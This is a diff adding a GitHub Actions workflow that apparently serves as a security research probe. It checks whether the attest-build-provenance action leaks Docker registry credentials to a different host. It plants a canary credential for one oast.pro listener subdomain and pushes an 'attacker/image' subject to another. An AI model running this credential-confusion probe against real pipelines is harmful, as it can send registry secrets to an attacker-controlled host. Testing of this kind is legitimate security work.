@@ -1,0 +1,25 @@
+name: att027-registry-credential-confusion
+on:
+  push:
+    branches: [att027]
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+jobs:
+  attest:
+    runs-on: ubuntu-latest
+    steps:
+      - name: docker credential configured ONLY for the host a.db3e5p9hkp3kppfe703gtspxo88e38pzg.oast.pro
+        run: |
+          mkdir -p ~/.docker
+          echo '{"auths":{"a.db3e5p9hkp3kppfe703gtspxo88e38pzg.oast.pro":{"auth":"dmljdGltLXVzZXI6Q0FOQVJZX1JFR0lTVFJZX1NFQ1JFVF8wMjc="}}}' > ~/.docker/config.json
+          cat ~/.docker/config.json
+      - name: attest + push-to-registry for a subject on the DIFFERENT host db3e5p9hkp3kppfe703gtspxo88e38pzg.oast.pro
+        uses: actions/attest-build-provenance@v2
+        continue-on-error: true
+        with:
+          subject-name: db3e5p9hkp3kppfe703gtspxo88e38pzg.oast.pro/attacker/image
+          subject-digest: sha256:0000000000000000000000000000000000000000000000000000000000000027
+          push-to-registry: true
+      - run: echo "done (the listener on db3e5p9hkp3kppfe703gtspxo88e38pzg.oast.pro records what the action sent)"
